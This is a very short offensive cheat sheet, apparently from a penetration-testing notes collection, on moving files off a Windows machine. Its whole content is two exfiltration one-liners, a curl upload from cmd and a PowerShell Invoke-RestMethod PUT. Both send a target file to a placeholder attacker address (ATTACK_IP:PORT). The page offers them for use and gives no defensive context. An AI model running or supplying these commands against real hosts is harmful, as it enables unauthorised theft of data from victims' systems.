# File Transfer from Windows

### 1) cmd

    curl --upload-file test.txt http://ATTACK_IP:PORT/

### 2) powershell

    Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE
